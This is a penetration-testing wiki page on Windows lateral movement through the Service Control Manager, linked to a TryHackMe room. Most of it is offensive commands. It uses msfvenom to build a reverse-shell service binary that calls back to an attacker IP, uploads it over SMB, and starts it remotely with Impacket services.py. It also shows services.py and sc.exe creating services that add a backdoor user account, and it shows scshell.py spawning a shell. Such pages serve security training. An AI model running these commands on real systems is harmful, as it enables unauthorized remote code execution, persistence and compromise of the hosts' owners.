# Services (SVCCTL)

## Theory

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:

* By using [MS-SCMR](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f) protocols over RPC to connect EMP at port 135. WIll ask for the SVCCTL RPC Endpoint wich is a dynamic port
* Try to reach SVCCTL Through SMB named pipes (\PIPE\svcctl) on port 445 (SMB) or 139 (SMB over NetBIOS)

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
### Service.py

The [Impacket](https://github.com/SecureAuthCorp/impacket) script [service.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/service.py) can be use to interact with services remotely.

```bash
# create an exe as a service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<PORT> -f exe-service --platform windows -e x64/xor_dynamic  -o shell.exe

# Upload the exe to windows machine
smbclient '\\<TARGET>\smbshare' -U <user> -c "put shell.exe test.exe"

# Using impacket services.py create service remotely
services.py <DOMAIN>/<user>@<TARGET> create -name shell-svc -display my-shell-svc -path "\\\\<TARGET>\\smbshare\\shell.exe"

# Using impacket services.py start the service and get the shell
services.py <DOMAIN>/<user>@<TARGET> start -name shell-svc

# Using impacket services.py delete the service
services.py <DOMAIN>/<user>@<TARGET> delete -name shell-svc
```

We also can execute commands instead of a binary

```bash
# Using impacket services.py create service remotely
services.py <DOMAIN>/<user>@<TARGET> create -name addme -display addme -path "net user munra Pass123 /add"

# Using impacket services.py start the service and get the shell
services.py <DOMAIN>/<user>@<TARGET> start -name addme

# Using impacket services.py delete the service
services.py <DOMAIN>/<user>@<TARGET> delete -name addme
```

{% hint style="info" %}
You will get an error starting the service but the commands will still be executed
{% endhint %}

### Scshell.py

The script [scshell.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/scshell.py) can automate the process to spawn a shell

```bash
#Create a service, get shell, delete service
scshell.py domain/<user>@<TARGET>
```
{% endtab %}

{% tab title="Windows" %}
On windows, we can use the built in sc.exe binary to remotely interact with services

```bash
#Start a remote service
sc.exe \\TARGET create MyService binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start MyService

#Stop and delete a remote service
sc.exe \\TARGET stop MyService
sc.exe \\TARGET delete MyService
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/lateralmovementandpivoting" %}
